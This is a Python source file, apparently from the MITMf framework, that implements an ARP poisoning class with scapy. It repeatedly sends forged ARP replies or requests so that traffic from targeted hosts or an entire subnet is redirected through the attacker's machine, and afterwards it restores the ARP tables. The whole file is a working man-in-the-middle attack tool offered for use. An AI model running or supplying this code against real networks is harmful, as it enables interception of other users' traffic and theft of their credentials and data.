import logging
import threading

from traceback import print_exc
from netaddr import IPNetwork, IPRange, IPAddress, AddrFormatError
from time import sleep
from core.utils import shutdown
from scapy.all import *

mitmf_logger = logging.getLogger('mitmf')

class ARPpoisoner():

    def __init__(self, gateway, interface, mac, targets):

        try:
            self.gatewayip  = str(IPAddress(gateway))
        except AddrFormatError as e:
            shutdown("[ARPpoisoner] Specified an invalid IP address as gateway")

        self.gatewaymac = getmacbyip(gateway)
        self.mymac      = mac
        self.targets    = self.getTargetRange(targets)
        self.interface  = interface
        self.arpmode    = 'rep'
        self.debug      = False
        self.send       = True
        self.interval   = 3

    def getTargetRange(self, targets):
        if targets is None:
            return None
        
        try:
            targetList = []

            for target in targets.split(','):
                if '/' in target:
                    targetList.append(IPNetwork(target))

                elif '-' in target:
                    first_half = target.split('-')[0]
                    second_half = first_half + target.split('-')[1]
                    targetList.append(IPRange(first_half, second_half))

                else:
                    targetList.append(IPAddress(target))

            return targetList
        
        except AddrFormatError as e:
            shutdown("[ARPpoisoner] Specified an invalid IP address/range/network as target")

    def start(self):
        if self.gatewaymac is None:
            shutdown("[ARPpoisoner] Error: Could not resolve gateway's MAC address")

        mitmf_logger.debug("[ARPpoisoner] gatewayip  => {}".format(self.gatewayip))
        mitmf_logger.debug("[ARPpoisoner] gatewaymac => {}".format(self.gatewaymac))
        mitmf_logger.debug("[ARPpoisoner] targets    => {}".format(self.targets))
        mitmf_logger.debug("[ARPpoisoner] mymac      => {}".format(self.mymac))
        mitmf_logger.debug("[ARPpoisoner] interface  => {}".format(self.interface))
        mitmf_logger.debug("[ARPpoisoner] arpmode    => {}".format(self.arpmode))
        mitmf_logger.debug("[ARPpoisoner] interval   => {}".format(self.interval))

        if self.arpmode == 'rep':
            t = threading.Thread(name='ARPpoisoner-rep', target=self.poisonARPrep)

        elif self.arpmode == 'req':
            t = threading.Thread(name='ARPpoisoner-req', target=self.poisonARPreq)

        t.setDaemon(True)
        t.start()

    def stop(self):
        self.send = False
        sleep(3)
        self.interval = 1
        
        if self.targets:
            self.restoreTarget(2)

        elif self.targets is None:
            self.restoreNet(5)

    def poisonARPrep(self):
        while self.send:
            
            if self.targets is None:
                pkt = Ether(src=self.mymac, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=self.mymac, psrc=self.gatewayip, op="is-at")
                sendp(pkt, iface=self.interface, verbose=self.debug) #sends at layer 2

            elif self.targets:
                #Since ARP spoofing relies on knowing the targets MAC address, this whole portion is just error handling in case we can't resolve it
                for target in self.targets:

                    if type(target) is IPAddress:
                        targetip = str(target)

                        try:
                            targetmac = getmacbyip(targetip)

                            if targetmac is None:
                                mitmf_logger.debug("[ARPpoisoner] Unable to resolve MAC address of {}".format(targetip))

                            elif targetmac:
                                send(ARP(pdst=targetip, psrc=self.gatewayip, hwdst=targetmac, op="is-at"), iface=self.interface, verbose=self.debug)
                                send(ARP(pdst=self.gatewayip, psrc=targetip, hwdst=self.gatewaymac, op="is-at", ), iface=self.interface, verbose=self.debug)

                        except Exception as e:
                            if "Interrupted system call" not in e:
                               mitmf_logger.error("[ARPpoisoner] Exception occurred while poisoning {}: {}".format(targetip, e))
                            pass

                    if (type(target) is IPRange) or (type(target) is IPNetwork):
                        for targetip in target:
                            try:
                                targetmac = getmacbyip(str(targetip))

                                if targetmac is None:
                                    mitmf_logger.debug("[ARPpoisoner] Unable to resolve MAC address of {}".format(targetip))

                                elif targetmac:
                                    send(ARP(pdst=str(targetip), psrc=self.gatewayip, hwdst=targetmac, op="is-at"), iface=self.interface, verbose=self.debug)
                                    send(ARP(pdst=self.gatewayip, psrc=str(targetip), hwdst=self.gatewaymac, op="is-at", ), iface=self.interface, verbose=self.debug)

                            except Exception as e:
                                if "Interrupted system call" not in e:
                                   mitmf_logger.error("[ARPpoisoner] Exception occurred while poisoning {}: {}".format(targetip, e))
                                   print_exc()
                                pass

            sleep(self.interval)

    def poisonARPreq(self):
        while self.send:
            
            if self.targets is None:
                pkt = Ether(src=self.mymac, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=self.mymac, psrc=self.gatewayip, op="who-has")
                sendp(pkt, iface=self.interface, verbose=self.debug) #sends at layer 2

            elif self.targets:
                
                for target in self.targets:

                    if type(target) is IPAddress:
                        targetip = str(target)
                        try:
                            targetmac = getmacbyip(targetip)
                            
                            if targetmac is None:
                                mitmf_logger.debug("[ARPpoisoner] Unable to resolve MAC address of {}".format(targetip))

                            elif targetmac:
                                send(ARP(pdst=targetip, psrc=self.gatewayip, hwdst=targetmac, op="who-has"), iface=self.interface, verbose=self.debug)
                                send(ARP(pdst=self.gatewayip, psrc=targetip, hwdst=self.gatewaymac, op="who-has"), iface=self.interface, verbose=self.debug)

                        except Exception as e:
                            if "Interrupted system call" not in e:
                               mitmf_logger.error("[ARPpoisoner] Exception occurred while poisoning {}: {}".format(targetip, e))
                            pass
                    
                    if (type(target) is IPRange) or (type(target) is IPNetwork):
                        for targetip in target:
                            try:
                                targetmac = getmacbyip(str(targetip))
                                
                                if targetmac is None:
                                    mitmf_logger.debug("[ARPpoisoner] Unable to resolve MAC address of {}".format(targetip))

                                elif targetmac:
                                    send(ARP(pdst=str(targetip), psrc=self.gatewayip, hwdst=targetmac, op="who-has"), iface=self.interface, verbose=self.debug)
                                    send(ARP(pdst=self.gatewayip, psrc=str(targetip), hwdst=self.gatewaymac, op="who-has"), iface=self.interface, verbose=self.debug)

                            except Exception as e:
                                if "Interrupted system call" not in e:
                                   mitmf_logger.error("[ARPpoisoner] Exception occurred while poisoning {}: {}".format(targetip, e))
                                pass

            sleep(self.interval)

    def restoreNet(self, count):
        mitmf_logger.info("[ARPpoisoner] Restoring subnet connection with {} packets".format(count))
        pkt = Ether(src=self.gatewaymac, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=self.gatewaymac, psrc=self.gatewayip, op="is-at")
        sendp(pkt, inter=self.interval, count=count, iface=self.interface, verbose=self.debug) #sends at layer 2

    def restoreTarget(self, count):
        for target in self.targets:

            if type(target) is IPAddress:
                targetip = str(target)

                try:
                    targetmac = getmacbyip(targetip)
                    
                    if targetmac is None:
                        mitmf_logger.debug("[ARPpoisoner] Unable to resolve MAC address of {}".format(targetip))

                    elif targetmac:
                        mitmf_logger.info("[ARPpoisoner] Restoring connection {} <-> {} with {} packets per host".format(targetip, self.gatewayip, count))

                        send(ARP(op="is-at", pdst=self.gatewayip, psrc=targetip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=targetmac), iface=self.interface, count=count, verbose=self.debug)
                        send(ARP(op="is-at", pdst=targetip, psrc=self.gatewayip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gatewaymac), iface=self.interface, count=count, verbose=self.debug)

                except Exception as e:
                    if "Interrupted system call" not in e:
                       mitmf_logger.error("[ARPpoisoner] Exception occurred while poisoning {}: {}".format(targetip, e))
                    pass

            if (type(target) is IPRange) or (type(target) is IPNetwork):
                for targetip in target:
                    try:
                        targetmac = getmacbyip(str(targetip))
                        
                        if targetmac is None:
                            mitmf_logger.debug("[ARPpoisoner] Unable to resolve MAC address of {}".format(targetip))

                        elif targetmac:
                            mitmf_logger.info("[ARPpoisoner] Restoring connection {} <-> {} with {} packets per host".format(targetip, self.gatewayip, count))

                            send(ARP(op="is-at", pdst=self.gatewayip, psrc=str(targetip), hwdst="ff:ff:ff:ff:ff:ff", hwsrc=targetmac), iface=self.interface, count=count, verbose=self.debug)
                            send(ARP(op="is-at", pdst=str(targetip), psrc=self.gatewayip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gatewaymac), iface=self.interface, count=count, verbose=self.debug)

                    except Exception as e:
                        if "Interrupted system call" not in e:
                           mitmf_logger.error("[ARPpoisoner] Exception occurred while poisoning {}: {}".format(targetip, e))
                        pass
